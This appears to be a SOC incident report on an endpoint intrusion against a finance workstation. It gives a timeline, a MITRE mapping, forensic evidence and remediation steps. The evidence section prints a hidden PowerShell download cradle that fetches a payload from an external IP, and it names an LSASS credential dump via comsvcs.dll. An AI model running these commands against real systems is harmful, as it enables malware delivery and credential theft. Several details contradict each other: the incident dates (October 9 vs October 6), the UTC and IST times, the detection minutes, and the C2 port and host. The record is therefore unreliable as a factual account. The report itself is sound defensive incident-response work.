# 🚨 Formal Incident Investigation Report: INC0010004
**Enterprise Security Operations Center (SOC) & Computer Security Incident Response Team (CSIRT)**

---

## 📋 Document Control & Metadata

| Field | Detail |
| :--- | :--- |
| **Incident Tracking ID** | **INC0010004** |
| **Incident Title** | Multi-Stage Endpoint Intrusion, Evasion & LSASS Credential Harvesting |
| **Classification** | Security Incident / High-Impact Cyber Attack |
| **Incident Severity / Priority** | **P1 - Critical** |
| **Incident Status** | **Resolved & Closed** |
| **Investigation Date** | October 9, 2026 |
| **Incident Lead Investigator** | SOC Tier 2 Analyst / Incident Handler |
| **Escalation Management** | SOC Manager & CSIRT Incident Commander |
| **Primary Affected Host** | `CORP-WORKSTATION01` (`192.168.XX.XX`) - Finance Department |
| **Compromised Account** | `CORP\finance_svc` (Service Account with Local Administrator rights) |
| **Attacker Infrastructure** | `185.220.101.5` (Known Tor Exit / Malicious C2 Node) |

---

## 1. 💼 Executive Summary

On **October 9, 2026**, between **19:30 UTC and 20:45 UTC**, the Enterprise SOC SIEM (Splunk Enterprise) detected and triaged a coordinated, multi-stage cyber intrusion targeting workstation `CORP-WORKSTATION01`. 

The intrusion initiated with an external password spraying campaign originating from external IP `185.220.101.5`. The adversary successfully authenticated against the domain service account `CORP\finance_svc`. Following initial access, the adversary executed a double-extension disguised phishing payload (`Invoice_Q3.pdf.exe`), launched an obfuscated PowerShell download cradle to retrieve secondary malware, and initiated an **LSASS memory dump** (`lsass.dmp`) using `rundll32.exe` via `comsvcs.dll` to extract domain credential hashes. Outbound command-and-control (C2) beaconing was intercepted and alerted by Suricata Network IDS.

The SOC responded rapidly, adhering to standard incident response playbooks:
- **Mean Time to Detect (MTTD):** **4 minutes**
- **Mean Time to Acknowledge (MTTA):** **4 minutes** (SLA target: $< 15$ minutes)
- **Mean Time to Contain (MTTC):** **22 minutes** (Host isolated, credentials revoked)
- **Mean Time to Resolve (MTTR):** **75 minutes** (SLA target: $< 120$ minutes)

Due to rapid detection and immediate endpoint network isolation, **no lateral movement across the internal subnet occurred**, and no sensitive corporate data was exfiltrated. All adversary artifacts have been eradicated, and perimeter blocking rules are actively enforced.

---

## 2. 🎯 Scope & Business Impact Assessment

### 2.1 CIA Triad Impact Matrix

| Dimension | Impact Level | Assessment Summary |
| :--- | :---: | :--- |
| **Confidentiality** | **Moderate** | Potential compromise of memory-resident password hashes for `CORP\finance_svc`. No customer databases or sensitive file shares were accessed. |
| **Integrity** | **Low-Moderate** | Unauthorized files dropped in public directories (`Invoice_Q3.pdf.exe`, `update.exe`, `lsass.dmp`). Core OS binaries and registry remained unmodified. |
| **Availability** | **Minimal** | Affected workstation was isolated for 53 minutes during eradication and forensic verification. Finance operations were temporarily routed to backup systems. |

### 2.2 Asset Scope
- **Directly Compromised Assets:** 1 (`CORP-WORKSTATION01`)
- **Impacted User Accounts:** 1 (`CORP\finance_svc`)
- **Network Boundaries Cross-Checked:** 0 lateral connections identified; adjacent hosts clean.

---

## 3. 🗺️ MITRE ATT&CK Framework Mapping

| Tactic | Technique ID | Technique Name | Detection Mechanism |
| :--- | :--- | :--- | :--- |
| **Initial Access** | `T1110` | Password Spraying | Windows Security Event `4625` threshold rule |
| **Initial Access** | `T1078` | Valid Accounts: Domain Accounts | Windows Security Event `4624` (Logon Type 3) |
| **Execution** | `T1566` | Spearphishing Attachment | Sysmon Event `11` (FileCreate) & Event `1` |
| **Execution** | `T1059` | PowerShell Interpreter | Sysmon Event `1` with `-W Hidden -Exec Bypass` |
| **Defense Evasion** | `T1027` | Obfuscated Files or Information | Disguised double-extension (`.pdf.exe`) |
| **Credential Access** | `T1003` | OS Credential Dumping: LSASS Memory | Sysmon Event `10` (`lsass.exe` ProcessAccess) |
| **Command & Control** | `T1071` | Web Protocols (CobaltStrike User-Agent) | Suricata NIDS Rule (`eve.json` alert signature) |

---

## 4. ⏱️ Detailed Chronological Incident Timeline

```mermaid
timeline
    title Incident INC0010004 Attack & Response Timeline (IST)
    22:59:00 : Password spraying begins from 185.220.101.5 (24 Event 4625s)
    23:01:15 : Successful authentication on CORP\\finance_svc (Event 4624)
    23:05:00 : Disguised executable Invoice_Q3.pdf.exe dropped and executed
    23:06:45 : PowerShell download cradle fetches update.exe from C2:8080
    23:08:10 : Suricata triggers alert on CobaltStrike/4.5 User-Agent
    23:09:20 : Rundll32 LSASS memory dump executed (lsass.dmp)
    23:10:00 : Splunk Correlation Rule fires critical multi-stage alert
    23:14:00 : Ticket INC0010004 opened in ServiceNow; assigned to SOC L2
    23:32:00 : CONTAINMENT: Host CORP-WORKSTATION01 isolated via EDR
    23:38:00 : CONTAINMENT: Account finance_svc disabled; Kerberos revoked
    23:45:00 : ERADICATION: Malicious binaries and dumps quarantined & deleted
    23:58:00 : RECOVERY: Perimeter firewall block pushed for 185.220.101.5/32
    00:15:00 : CLOSURE: Post-incident forensic scan clean; Ticket marked Solved
```

| Timestamp (IST) | Source / Component | Event ID / Log Type | Event Description & Analyst Observations |
| :--- | :--- | :--- | :--- |
| **22:59:15** | Windows Security | `EventCode 4625` | 24 failed logon attempts targeting 8 distinct accounts (`mscott`, `bwayne`, `dharvey`, etc.) from external IP `185.220.101.5`. |
| **23:01:15** | Windows Security | `EventCode 4624` | Successful Network Logon (Type 3) under account `CORP\finance_svc`. |
| **23:05:00** | Sysmon EDR | `EventCode 11` | File created: `C:\Users\Public\Downloads\Invoice_Q3.pdf.exe`. Double-extension disguise. |
| **23:05:10** | Sysmon EDR | `EventCode 1` | Execution of `Invoice_Q3.pdf.exe` spawning child processes `cmd.exe /c whoami && ipconfig /all` for local host reconnaissance. |
| **23:06:45** | Sysmon EDR | `EventCode 1` | `powershell.exe` spawned with arguments `-NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest ... /payload.exe -OutFile ...\update.exe"`. |
| **23:08:10** | Suricata NIDS | `alert (eve.json)` | Rule `ET USER_AGENTS CobaltStrike/4.5` triggered outbound to destination IP `185.220.101.5`. |
| **23:09:20** | Sysmon EDR | `EventCode 10` | `rundll32.exe` requested `GrantedAccess: 0x1fffff` (Full Access) into `C:\Windows\System32\lsass.exe` using `comsvcs.dll, MiniDump` writing to `C:\Users\Public\lsass.dmp`. |
| **23:10:00** | Splunk Enterprise | Correlation Alert | `[CRITICAL] Multi-Stage Intrusion Correlation Rule` triggered across host, EDR, and NIDS data sources. |
| **23:14:00** | ServiceNow ITSM | `INC0010004` | Ticket auto-created and assigned to SOC L2 Analyst. Triage initiated within SLA. |
| **23:32:00** | SOC Containment | EDR Isolation | Workstation `CORP-WORKSTATION01` placed in network quarantine. |
| **23:38:00** | SOC Containment | Active Directory | Account `CORP\finance_svc` disabled; Kerberos Ticket-Granting Tickets (TGT) purged. |
| **23:45:00** | SOC Eradication | Endpoint Forensic | Dropped files (`Invoice_Q3.pdf.exe`, `update.exe`, `lsass.dmp`) deleted; persistence checks negative. |
| **23:58:00** | SOC Perimeter | Firewall Rule | Perimeter firewall rule pushed: Block Inbound/Outbound `185.220.101.5/32`. |
| **00:15:00** | SOC Closure | Incident Review | Forensic scan confirms asset integrity. Ticket status updated to **Resolved**. |

---

## 5. 🔬 Forensic Evidence & Telemetry Analysis

### 5.1 Endpoint Detection & Response (Sysmon Telemetry)

#### Evidence Item A: Process Execution (`EventCode 1`)
- **Process ID:** `4812`
- **Parent Process:** `explorer.exe` (PID: `2104`)
- **Image:** `C:\Users\Public\Downloads\Invoice_Q3.pdf.exe`
- **CommandLine:** `C:\Users\Public\Downloads\Invoice_Q3.pdf.exe /c whoami && ipconfig /all`
- **User:** `CORP\finance_svc`
- **Hash (SHA256):** `9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08`

#### Evidence Item B: Hidden PowerShell Execution (`EventCode 1`)
- **Process ID:** `5936`
- **Parent Process:** `Invoice_Q3.pdf.exe` (PID: `4812`)
- **Image:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- **CommandLine:** `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri 'http://185.220.101.5:8080/payload.exe' -OutFile 'C:\Users\Public\update.exe' -ErrorAction SilentlyContinue"`

#### Evidence Item C: LSASS Memory Injection/Access (`EventCode 10`)
- **Source Image:** `C:\Windows\System32\rundll32.exe`
- **Target Image:** `C:\Windows\System32\lsass.exe`
- **GrantedAccess:** `0x1fffff` *(PROCESS_ALL_ACCESS)*
- **CallTrace:** `C:\Windows\SYSTEM32\ntdll.dll+...|C:\Windows\System32\KERNELBASE.dll+...|C:\Windows\System32\comsvcs.dll+0x15340`

---

### 5.2 Network Intrusion Detection (Suricata Telemetry)

#### Evidence Item D: Suricata Alert JSON (`eve.json`)
```json
{
  "timestamp": "2026-10-06T19:38:10.124508+0000",
  "flow_id": 1402938491823,
  "event_type": "alert",
  "src_ip": "192.168.158.135",
  "src_port": 50412,
  "dest_ip": "185.220.101.5",
  "dest_port": 80,
  "proto": "TCP",
  "alert": {
    "action": "allowed",
    "gid": 1,
    "signature_id": 2024106,
    "rev": 1,
    "signature": "ET USER_AGENTS Suspicious User-Agent (CobaltStrike)",
    "category": "A Network Trojan was detected",
    "severity": 1
  },
  "http": {
    "hostname": "testmyids.com",
    "url": "/",
    "http_user_agent": "CobaltStrike/4.5"
  }
}
```

---

## 6. 🛡️ Containment, Eradication & Recovery Actions

### Phase 1: Containment (Completed at T+22 min)
1. **Host Isolation:** Executed network disconnection of `CORP-WORKSTATION01` via local firewall rules and hypervisor interface control to sever attacker interactive sessions.
2. **Account Disablement:** Contacted Identity Administration to set `CORP\finance_svc` account status to disabled. Purged all active Kerberos sessions and cached tickets (`klist purge`).
3. **Session Termination:** Disconnected all active IPC$ sessions (`net use * /delete /y`).

### Phase 2: Eradication (Completed at T+35 min)
1. **Process Termination:** Verified process trees; killed lingering instances of `rundll32.exe`, `powershell.exe`, and disguised binaries.
2. **File Removal & Quarantine:**
   - Deleted `C:\Users\Public\Downloads\Invoice_Q3.pdf.exe`
   - Deleted `C:\Users\Public\update.exe`
   - Deleted `C:\Users\Public\lsass.dmp`
3. **Persistence Verification:** Audited Scheduled Tasks, Registry Run Keys (`HKLM\Software\Microsoft\Windows\CurrentVersion\Run`), and Startup folders. No persistence mechanisms discovered.

### Phase 3: Recovery (Completed at T+75 min)
1. **Firewall Ingress/Egress Rule:** Created enterprise perimeter block for IPv4 `185.220.101.5/32`.
2. **Credential Reset:** Generated new 32-character complex credentials for `finance_svc` with interactive logon restrictions enforced.
3. **Post-Incident Scan:** Executed full Microsoft Defender & Sysmon forensic audit; zero remaining threat indicators identified.

---

## 7. 🔍 Root Cause Analysis (RCA) - 5 Whys

```
Adversary obtained access to corporate asset and dumped LSASS credentials
  │
  ├─► WHY 1: Adversary successfully authenticated via password spraying
  │     └─► WHY: Account 'finance_svc' was protected by a weak, guessable password
  │
  ├─► WHY 2: Weak password was permitted on an active service account
  │     └─► WHY: Service accounts were exempt from enterprise password complexity policies
  │
  ├─► WHY 3: Disguised binary was executed from a public writable directory
  │     └─► WHY: AppLocker / Software Restriction Policies were not configured on C:\Users\Public\
  │
  ├─► WHY 4: LSASS process memory was dumped without EDR process prevention
  │     └─► WHY: Windows Defender Credential Guard (LSA Protection) was disabled
  │
  └─► ROOT CAUSE: Lack of credential hygiene on service accounts combined with 
                 absence of RunAsPPL (LSA Protection) and Software Execution Policies.
```

---

## 8. 💡 Corrective & Preventive Action Plan (CAPA)

| Priority | Corrective Action | Owner | Target Completion | Status |
| :---: | :--- | :--- | :---: | :---: |
| **P1** | Enable **LSA Protection (`RunAsPPL=1`)** and Credential Guard across all endpoints via GPO. | Systems Engineering | 3 Days | In Progress |
| **P1** | Implement **Group Managed Service Accounts (gMSA)** for all service accounts with 128-bit rotating passwords. | Identity Team | 7 Days | Scheduled |
| **P2** | Deploy **AppLocker / Windows Defender Application Control (WDAC)** blocking execution from writable paths (`C:\Users\Public\*`, `C:\Windows\Temp\*`). | Endpoint Security | 14 Days | In Progress |
| **P2** | Restrict **PowerShell Constrained Language Mode (CLM)** for non-admin accounts. | Endpoint Security | 14 Days | Scheduled |
| **P3** | Fine-tune Splunk correlation rule for automated ticket creation directly into ServiceNow Security Operations (SecOps). | SOC Engineering | 21 Days | Complete |

---

<!-- ## 9. 📈 SLA Performance & Incident Metrics

| Metric | Target SLA | Actual Performance | Status |
| :--- | :---: | :---: | :---: |
| **Mean Time to Detect (MTTD)** | $< 15\text{ min}$ | **5 minutes** | ✅ **Passed** |
| **Mean Time to Acknowledge (MTTA)** | $< 15\text{ min}$ | **5 minutes** | ✅ **Passed** |
| **Mean Time to Contain (MTTC)** | $< 30\text{ min}$ | **22 minutes** | ✅ **Passed** |
| **Mean Time to Resolve (MTTR)** | $< 120\text{ min}$ | **75 minutes** | ✅ **Passed** |

--- -->

<!-- ## 10. 📝 Incident Sign-Off & Approvals

- **Investigating Analyst:** SOC Tier 2 Incident Handler  
  *Signature:* `Verified (SOC-IR-T2)` | *Date:* October 6, 2026
- **SOC Operations Lead:** SOC Incident Commander  
  *Signature:* `Approved (SOC-LEAD)` | *Date:* October 6, 2026
- **IT Security Director:** Director of Information Security  
  *Signature:* `Reviewed & Closed (CISO-DELEGATE)` | *Date:* October 7, 2026 -->
